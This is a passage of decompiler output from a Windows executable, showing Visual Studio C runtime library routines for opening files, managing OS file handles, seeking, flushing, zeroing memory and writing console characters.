    if ((param_3 & 2) == 0) goto LAB_0041a61f;
    local_1c = __lseek_nolock(*in_EAX,-1,2);
    if (local_1c == 0xffffffff) {
      puVar5 = ___doserrno();
      bVar11 = local_5;
      if (*puVar5 == 0x83) goto LAB_0041a61f;
    }
    else {
      local_28 = 0;
      iVar12 = __read_nolock(*in_EAX,&local_28,1);
      if ((((iVar12 != 0) || ((short)local_28 != 0x1a)) ||
          (iVar12 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,(int)local_1c >> 0x1f)), iVar12 != -1
          )) && (lVar8 = __lseek_nolock(*in_EAX,0,0), bVar11 = local_5, lVar8 != -1))
      goto LAB_0041a61f;
    }
LAB_0041a5d1:
    __close_nolock(*in_EAX);
    goto LAB_0041a4d8;
  }
LAB_0041a61f:
  local_5 = bVar11;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_24 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_24 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_0041a68e;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_0041a68e:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_1c = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_c & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_18 == 0) goto LAB_0041a859;
        if (2 < local_18) {
          if (local_18 < 5) {
            lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar14 == 0) goto LAB_0041a6f3;
            lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
            uVar4 = (uint)lVar14 & (uint)((ulonglong)lVar14 >> 0x20);
            goto LAB_0041a7bf;
          }
LAB_0041a6ea:
          if (local_18 != 5) goto LAB_0041a859;
        }
LAB_0041a6f3:
        iVar12 = 0;
        if (local_6 == 1) {
          local_1c = 0xbfbbef;
          local_18 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_0041a859;
          local_1c = 0xfeff;
          local_18 = 2;
        }
        do {
          iVar9 = __write(*in_EAX,(void *)((int)&local_1c + iVar12),local_18 - iVar12);
          if (iVar9 == -1) goto LAB_0041a5d1;
          iVar12 = iVar12 + iVar9;
        } while (iVar12 < (int)local_18);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_18 != 0)) {
            if (2 < local_18) {
              if (4 < local_18) goto LAB_0041a6ea;
              lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar14 != 0) {
                lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
                if (lVar14 == -1) goto LAB_0041a5d1;
                goto LAB_0041a744;
              }
            }
            goto LAB_0041a6f3;
          }
          goto LAB_0041a859;
        }
LAB_0041a744:
        iVar12 = __read_nolock(*in_EAX,&local_1c,3);
        if (iVar12 == -1) goto LAB_0041a5d1;
        if (iVar12 == 2) {
LAB_0041a7cd:
          if ((local_1c & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_1c & 0xffff) == 0xfeff) {
            lVar8 = __lseek_nolock(*in_EAX,2,0);
            if (lVar8 == -1) goto LAB_0041a5d1;
            local_6 = 2;
            goto LAB_0041a859;
          }
        }
        else if (iVar12 == 3) {
          if (local_1c == 0xbfbbef) {
            local_6 = 1;
            goto LAB_0041a859;
          }
          goto LAB_0041a7cd;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_0041a7bf:
        if (uVar4 == 0xffffffff) goto LAB_0041a5d1;
      }
    }
  }
LAB_0041a859:
  uVar4 = local_c;
  pbVar1 = (byte *)((&DAT_0042d780)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_0042d780)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_0042d780)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
    CloseHandle(local_20);
    pvVar10 = CreateFileW(param_2,uVar4 & 0x7fffffff,local_14,&local_38,3,local_10,(HANDLE)0x0);
    if (pvVar10 == (HANDLE)0xffffffff) {
      DVar7 = GetLastError();
      __dosmaperr(DVar7);
      pbVar1 = (byte *)((&DAT_0042d780)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
      __free_osfhnd(*in_EAX);
LAB_0041a4d8:
      piVar6 = __errno();
      return *piVar6;
    }
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_0042d780)[(int)*in_EAX >> 5]) = pvVar10;
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wsopen_helper
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_helper(wchar_t *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00428de8;
  uStack_c = 0x41a96a;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (wchar_t *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = __tsopen_nolock(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_0041a9fc();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_0041a9fc(void)

{
  byte *pbVar1;
  int unaff_EBP;
  int unaff_ESI;
  uint *unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_ESI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_ESI) {
      pbVar1 = (byte *)((&DAT_0042d780)[(int)*unaff_EDI >> 5] + 4 + (*unaff_EDI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_EDI);
  }
  return;
}



// Library Function - Single Match
//  __wsopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_s(int *_FileHandle,wchar_t *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionFlag)

{
  errno_t eVar1;
  
  eVar1 = __wsopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionFlag,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __wcsnicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp_l(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  wchar_t wVar1;
  wchar_t wVar2;
  wint_t wVar3;
  wint_t wVar4;
  int iVar5;
  int *piVar6;
  uint uVar7;
  uint uVar8;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  iVar5 = 0;
  if (_MaxCount != 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar6 = __errno();
      *piVar6 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      iVar5 = 0x7fffffff;
    }
    else {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          uVar8 = (uint)(ushort)wVar1;
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)(ushort)wVar2;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
      }
      else {
        do {
          wVar3 = __towlower_l(*_Str1,&local_14);
          uVar8 = (uint)wVar3;
          wVar4 = __towlower_l(*_Str2,&local_14);
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)wVar4;
          if ((_MaxCount == 0) || (wVar3 == 0)) break;
        } while (wVar3 == wVar4);
      }
      iVar5 = uVar8 - uVar7;
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  __wcsnicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int iVar3;
  int *piVar4;
  
  if (DAT_0042c1e8 == 0) {
    iVar3 = 0;
    if (_MaxCount != 0) {
      if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
        piVar4 = __errno();
        *piVar4 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        iVar3 = 0x7fffffff;
      }
      else {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
        iVar3 = (uint)(ushort)wVar1 - (uint)(ushort)wVar2;
      }
    }
  }
  else {
    iVar3 = __wcsnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar3;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x41abf4,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_0041abfc;
  local_20 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_0041ad10();
    }
  }
  *unaff_FS_OFFSET = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_0042ae10 = param_1;
  DAT_0042ae0c = in_EAX;
  DAT_0042ae14 = unaff_EBP;
  return in_EAX;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_0042ae10 = param_1;
  DAT_0042ae0c = in_EAX;
  DAT_0042ae14 = unaff_EBP;
  return;
}



void FUN_0041ad10(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0042d77c)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (*(int *)(iVar3 + (&DAT_0042d780)[param_1 >> 5]) == -1) {
      if (DAT_0042a040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0041ad70;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_0041ad70:
      *(intptr_t *)(iVar3 + (&DAT_0042d780)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __free_osfhnd(int param_1)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0042d77c)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    piVar1 = (int *)((&DAT_0042d780)[param_1 >> 5] + iVar3);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (DAT_0042a040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0041adf6;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0041adf6:
      *(undefined4 *)(iVar3 + (&DAT_0042d780)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2008 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  intptr_t *piVar3;
  intptr_t iVar4;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if (((_FileHandle < 0) || (DAT_0042d77c <= (uint)_FileHandle)) ||
     (piVar3 = (intptr_t *)((_FileHandle & 0x1fU) * 0x40 + (&DAT_0042d780)[_FileHandle >> 5]),
     (*(byte *)(piVar3 + 1) & 1) == 0)) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar4 = -1;
  }
  else {
    iVar4 = *piVar3;
  }
  return iVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2008 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_0042d780)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_0041af28();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_0042d780)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



void FUN_0041af28(void)

{
  FUN_00413064(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_0042d780)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __alloc_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __alloc_osfhnd(void)

{
  bool bVar1;
  int iVar2;
  BOOL BVar3;
  undefined4 *puVar4;
  int iVar5;
  int local_20;
  
  local_20 = -1;
  iVar5 = 0;
  bVar1 = false;
  iVar2 = __mtinitlocknum(0xb);
  if (iVar2 == 0) {
    local_20 = -1;
  }
  else {
    __lock(0xb);
    for (; iVar5 < 0x40; iVar5 = iVar5 + 1) {
      puVar4 = (undefined4 *)(&DAT_0042d780)[iVar5];
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)__calloc_crt(0x20,0x40);
        if (puVar4 != (undefined4 *)0x0) {
          (&DAT_0042d780)[iVar5] = puVar4;
          DAT_0042d77c = DAT_0042d77c + 0x20;
          for (; puVar4 < (undefined4 *)((&DAT_0042d780)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
            *(undefined *)(puVar4 + 1) = 0;
            *puVar4 = 0xffffffff;
            *(undefined *)((int)puVar4 + 5) = 10;
            puVar4[2] = 0;
          }
          local_20 = iVar5 << 5;
          *(undefined *)((&DAT_0042d780)[local_20 >> 5] + 4) = 1;
          iVar2 = ___lock_fhandle(local_20);
          if (iVar2 == 0) {
            local_20 = -1;
          }
        }
        break;
      }
      for (; puVar4 < (undefined4 *)((&DAT_0042d780)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
        if ((*(byte *)(puVar4 + 1) & 1) == 0) {
          if (puVar4[2] == 0) {
            __lock(10);
            if (puVar4[2] == 0) {
              BVar3 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(puVar4 + 3),4000);
              if (BVar3 == 0) {
                bVar1 = true;
              }
              else {
                puVar4[2] = puVar4[2] + 1;
              }
            }
            FUN_0041b02b();
          }
          if (!bVar1) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            if ((*(byte *)(puVar4 + 1) & 1) == 0) {
              *(undefined *)(puVar4 + 1) = 1;
              *puVar4 = 0xffffffff;
              local_20 = ((int)puVar4 - (&DAT_0042d780)[iVar5] >> 6) + iVar5 * 0x20;
              break;
            }
            LeaveCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
          }
        }
      }
      if (local_20 != -1) break;
    }
    FUN_0041b0e9();
  }
  return local_20;
}



void FUN_0041b02b(void)

{
  FUN_00413064(10);
  return;
}



void FUN_0041b0e9(void)

{
  FUN_00413064(0xb);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2008 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0042d77c)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_0042d780)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_0042d780)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_0041b1b4;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_0041b1b4:
        FUN_0041b1c9();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0041b1c9(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_0042c1c8 = _DAT_0042c1c8 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0041b24d:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_0041b24d;
      }
    }
    pbVar1 = (byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0042d77c)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
        puVar1 = ___doserrno();
        *puVar1 = 0;
        piVar2 = __errno();
        *piVar2 = 9;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        local_28._4_4_ = 0xffffffff;
        local_28._0_4_ = 0xffffffff;
      }
      else {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_0041b3b0();
      }
      goto LAB_0041b3aa;
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_0041b3aa:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



void FUN_0041b3b0(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _fastzero_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastzero_I(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2 >> 7;
  do {
    *param_1 = (undefined  [16])0x0;
    param_1[1] = (undefined  [16])0x0;
    param_1[2] = (undefined  [16])0x0;
    param_1[3] = (undefined  [16])0x0;
    param_1[4] = (undefined  [16])0x0;
    param_1[5] = (undefined  [16])0x0;
    param_1[6] = (undefined  [16])0x0;
    param_1[7] = (undefined  [16])0x0;
    param_1 = param_1 + 8;
    uVar1 = uVar1 - 1;
  } while (uVar1 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memzero
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined (*) [16] __cdecl __VEC_memzero(undefined (*param_1) [16],undefined4 param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined (*pauVar5) [16];
  
  uVar2 = (int)param_1 >> 0x1f;
  iVar3 = (((uint)param_1 ^ uVar2) - uVar2 & 0xf ^ uVar2) - uVar2;
  if (iVar3 == 0) {
    uVar2 = param_3 & 0x7f;
    if (param_3 != uVar2) {
      _fastzero_I(param_1,param_3 - uVar2);
    }
    if (uVar2 != 0) {
      puVar4 = (undefined *)((int)param_1 + (param_3 - uVar2));
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
    }
  }
  else {
    iVar3 = 0x10 - iVar3;
    pauVar5 = param_1;
    for (iVar1 = iVar3; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*pauVar5)[0] = 0;
      pauVar5 = (undefined (*) [16])(*pauVar5 + 1);
    }
    __VEC_memzero((undefined (*) [16])((int)param_1 + iVar3),0,param_3 - iVar3);
  }
  return param_1;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2008 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  uint uVar2;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
    return 0;
  }
  if ((_FileHandle < 0) || (DAT_0042d77c <= (uint)_FileHandle)) {
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    uVar2 = 0;
  }
  else {
    uVar2 = (int)*(char *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
            0x40;
  }
  return uVar2;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  wint_t wVar1;
  BOOL BVar2;
  DWORD DVar3;
  UINT CodePage;
  wchar_t *lpWideCharStr;
  int cchWideChar;
  CHAR *lpMultiByteStr;
  int cbMultiByte;
  LPCSTR lpDefaultChar;
  LPBOOL lpUsedDefaultChar;
  DWORD local_14;
  CHAR local_10 [8];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  if (DAT_0042ae18 != 0) {
    if (DAT_0042af38 == (HANDLE)0xfffffffe) {
      ___initconout();
    }
    if (DAT_0042af38 == (HANDLE)0xffffffff) goto LAB_0041b5b0;
    BVar2 = WriteConsoleW(DAT_0042af38,&_WCh,1,&local_14,(LPVOID)0x0);
    if (BVar2 != 0) {
      DAT_0042ae18 = 1;
      goto LAB_0041b5b0;
    }
    if ((DAT_0042ae18 != 2) || (DVar3 = GetLastError(), DVar3 != 0x78)) goto LAB_0041b5b0;
    DAT_0042ae18 = 0;
  }
  lpUsedDefaultChar = (LPBOOL)0x0;
  lpDefaultChar = (LPCSTR)0x0;
  cbMultiByte = 5;
  lpMultiByteStr = local_10;
  cchWideChar = 1;
  lpWideCharStr = &_WCh;
  DVar3 = 0;
